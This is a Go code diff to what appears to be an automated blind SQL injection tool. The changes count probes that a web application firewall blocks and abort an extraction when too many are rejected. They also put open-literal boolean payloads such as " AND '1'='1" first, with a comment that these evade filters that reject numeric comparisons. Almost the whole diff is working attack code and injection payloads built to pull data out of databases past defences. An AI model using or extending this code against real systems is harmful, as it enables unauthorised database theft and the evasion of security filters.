@@ -22,6 +22,11 @@ type Executor struct {
 	falseBody string
 	baseline  time.Duration
 	probes    int64
+	// blockedProbes counts oracle requests the WAF rejected. A blind
+	// extraction treats a rejected response as "false", so a run of them
+	// silently converges on a wrong value; the count is used to abort the
+	// value instead.
+	blockedProbes int64
 
 	// raw disables payload transformation for the next request. It is used as
 	// a fallback when a tamper chain breaks an otherwise working boundary.
@@ -402,19 +407,35 @@ func (x *Executor) timeScalar(expr string) (string, error) {
 
 func (x *Executor) blindLength(expr string) (int, error) {
 	lengthExpr := x.Dialect.Length(scalarExpr(expr))
-	return x.binarySearch(0, x.maxLength(), func(mid int) bool {
+	before := atomic.LoadInt64(&x.blockedProbes)
+	value, err := x.binarySearch(0, x.maxLength(), func(mid int) bool {
 		return x.booleanOracle(lengthExpr + " >= " + strconv.Itoa(mid))
 	})
+	if err != nil {
+		return 0, err
+	}
+	if got := atomic.LoadInt64(&x.blockedProbes) - before; got > 3 {
+		return 0, fmt.Errorf("blind length blocked: %d oracle probes rejected by the filter", got)
+	}
+	return value, nil
 }
 
 func (x *Executor) blindChar(expr string, pos int) (int, error) {
 	sub := x.Dialect.Substr(scalarExpr(expr), pos, 1)
 	ascii := x.Dialect.ASCII(sub)
+	before := atomic.LoadInt64(&x.blockedProbes)
 	// Start at 0: control characters (row and column separators) are part of
 	// every aggregated value, and a lower bound of 31 silently rewrote them.
-	return x.binarySearch(0, 127, func(mid int) bool {
+	value, err := x.binarySearch(0, 127, func(mid int) bool {
 		return x.booleanOracle(ascii + " >= " + strconv.Itoa(mid))
 	})
+	if err != nil {
+		return 0, err
+	}
+	if got := atomic.LoadInt64(&x.blockedProbes) - before; got > 3 {
+		return 0, fmt.Errorf("blind character blocked: %d oracle probes rejected by the filter", got)
+	}
+	return value, nil
 }
 
 func (x *Executor) timeLength(expr string) (int, error) {
@@ -454,9 +475,12 @@ func (x *Executor) binarySearch(low, high int, predicate func(int) bool) (int, e
 // the equivalent quoted string comparison, so the oracle form is discovered
 // instead of assumed.
 var oraclePairs = [][2]string{
-	{" AND '1'='1'", " AND '1'='2'"},
+	// The open-literal form: the application's own closing quote completes the
+	// last string, so the payload carries no dangling quote and no comment.
+	// Filters that reject "1=1" as a numeric comparison usually allow this.
+	{" AND '1'='1", " AND '1'='2"},
+	{" AND 'a'='a", " AND 'a'='b"},
 	{" AND 1=1", " AND 1=2"},
-	{" AND 'a'='a'", " AND 'a'='b'"},
 	{" AND 1 LIKE 1", " AND 1 LIKE 2"},
 }
 
@@ -471,7 +495,7 @@ func (x *Executor) booleanOracle(cond string) bool {
 			if trueBody == "" || falseBody == "" {
 				continue
 			}
-			if responsesDiffer(trueBody, falseBody) {
+			if responsesDiffer(trueBody, falseBody) || booleanDiffer(trueBody, falseBody) {
 				x.trueBody, x.falseBody = trueBody, falseBody
 				break
 			}
@@ -503,7 +527,11 @@ func (x *Executor) booleanOracle(cond string) bool {
 
 func (x *Executor) booleanRequest(fragment string) string {
 	body, length, err := x.Request(fragment)
-	if err != nil || looksBlocked(x.E.LastStatusCode, length) {
+	if err != nil {
+		return ""
+	}
+	if looksBlocked(x.E.LastStatusCode, length) {
+		atomic.AddInt64(&x.blockedProbes, 1)
 		return ""
 	}
 	return body
